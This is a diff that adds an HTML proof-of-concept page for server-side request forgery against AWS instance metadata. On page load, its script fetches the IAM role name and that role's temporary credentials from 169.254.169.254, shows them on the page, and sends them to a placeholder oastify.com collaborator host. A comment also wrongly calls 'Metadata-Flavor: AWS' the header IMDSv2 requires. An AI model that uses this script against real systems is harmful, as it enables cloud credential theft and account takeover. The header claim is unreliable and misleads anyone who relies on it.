@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IMDS Exploit PoC</title>
+</head>
+<body>
+    <h1>SSRF PoC - AWS IMDS</h1>
+    <div id="result"></div>
+    
+    <script>
+    async function exploitIMDS() {
+        const resultDiv = document.getElementById('result');
+        
+        try {
+            // First, get the IAM role name
+            const roleResponse = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
+                headers: {
+                    'Metadata-Flavor': 'AWS'  // Required header for IMDSv2
+                }
+            });
+            
+            if (!roleResponse.ok) {
+                resultDiv.innerHTML += '<p style="color:red">❌ Failed to fetch role: ' + roleResponse.status + '</p>';
+                return;
+            }
+            
+            const roleName = await roleResponse.text();
+            resultDiv.innerHTML += '<p style="color:green">✅ Found role: ' + roleName + '</p>';
+            
+            // Then, get the credentials for that role
+            const credResponse = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + roleName.trim(), {
+                headers: {
+                    'Metadata-Flavor': 'AWS'
+                }
+            });
+            
+            if (!credResponse.ok) {
+                resultDiv.innerHTML += '<p style="color:red">❌ Failed to fetch credentials</p>';
+                return;
+            }
+            
+            const credentials = await credResponse.text();
+            resultDiv.innerHTML += '<p style="color:green">✅ Got credentials!</p>';
+            resultDiv.innerHTML += '<pre>' + credentials + '</pre>';
+            
+            // Optional: Exfiltrate to your server
+            fetch('https://your-collaborator-id.oastify.com/?data=' + encodeURIComponent(credentials));
+            
+        } catch (error) {
+            resultDiv.innerHTML += '<p style="color:red">❌ Error: ' + error.message + '</p>';
+        }
+    }
+    
+    exploitIMDS();
+    </script>
+</body>
+</html>
